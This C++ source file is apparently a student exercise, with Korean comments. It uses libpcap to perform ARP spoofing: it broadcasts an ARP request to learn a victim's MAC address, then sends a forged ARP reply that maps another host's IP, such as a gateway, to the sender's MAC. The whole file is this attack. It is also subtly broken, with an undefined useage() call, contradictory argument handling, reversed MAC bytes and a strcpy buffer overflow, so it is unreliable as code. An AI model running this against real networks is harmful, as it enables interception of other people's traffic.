#include "main.h"
#include "mac.h"
#include "ip.h"
#include "address.h"

#define MAC_ADDR_LEN 6 
using namespace std; 



void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	printf("%d",argc);
	
	if (argc < 2 || argc % 2 == 1){
		useage();
		return -1;
	}


	// ================== MAC Addrses =================================== 
	const char* interface = argv[1];

	uint8_t mac_addr[MAC_ADDR_LEN];

	// mac address & ipAddress
	unsigned char macAddress[6];
	char ipAddress[INET_ADDRSTRLEN]; // IP 주소는 최소 16자리를 할당해야 함
	//char src_mac[18];
	char src_mac[MAC_ADDR_LEN  * 3 + 1] = {0,};

	if(get_mac_address(string(argv[1]), mac_addr)){

		

		snprintf(src_mac, MAC_ADDR_LEN * 3, "%02X:%02X:%02X:%02X:%02X:%02X",
			mac_addr[5], mac_addr[4], mac_addr[3], mac_addr[2], mac_addr[1], mac_addr[0] );
		


		cout << "MAC Address " << string(src_mac) <<  endl;
	}


	// ================== IP Address ========================================
	cout << "IP Address" << endl;

	
    if (getIPAddress(interface, ipAddress)) {
        std::cout << "Interface: " << interface << std::endl;
        std::cout << "IP Address: " << ipAddress << std::endl;
    } else {
        std::cerr << "Failed to get IP address for " << interface << std::endl;
    }

	//=============================== victim 의 mac 주소를 알아내는 것 ====================
	
	
	char errbuf[PCAP_ERRBUF_SIZE];
	// pcap_open_live는 실시간으로 packet을 캡쳐하는 것 
	
	char* vic_ip = argv[1];
	pcap_t* handle = pcap_open_live(vic_ip,BUFSIZ,1,1,errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}



	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(src_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.op_ = htons(ArpHdr::Request);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(src_mac);
	packet.arp_.sip_ = htonl(Ip(ipAddress));

	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2]));


	

	//========================== replay packet을 보내고 vicitm의 mac 주소를 얻어내는 것 

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


	// packet을 reqeust 하고 reply 받아서 mac 주소 받아내기 
	char dst_mac[ETH_ALEN];

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int result = pcap_next_ex(handle, &header, &reply_packet);
        if (result == 0) {
            continue;
        }
        if (result == -1 || result == -2) {
            break;
        }

        EthArpPacket* pArpPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(reply_packet));

        // ARP reply 패킷인지 확인 및 target IP 확인
        if (ntohs(pArpPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(pArpPacket->arp_.op_) == ArpHdr::Reply &&
            pArpPacket->arp_.tip_ == packet.arp_.sip_ &&
            pArpPacket->arp_.sip_ == packet.arp_.tip_) {

            // 받은 패킷에서 target MAC 주소 추출
          	strcpy(dst_mac, std::string(pArpPacket->arp_.smac_).c_str());
            break;
        }
    }
	// Victim MAC 주소 출력
	printf("dst MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
	dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

	

	// ========= victim mac 주소를 활용해서 send reply packet 보내서 arp spoofing 하기 
	


	packet.eth_.dmac_ = Mac(dst_mac);
	packet.eth_.smac_ = Mac(src_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.op_ = htons(ArpHdr::Reply);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(src_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));

	packet.arp_.tmac_ = Mac(dst_mac);
	packet.arp_.tip_ = htonl(Ip(argv[2]));


	int ras = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
	if (ras != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", ras, pcap_geterr(handle));
	}




	pcap_close(handle);
}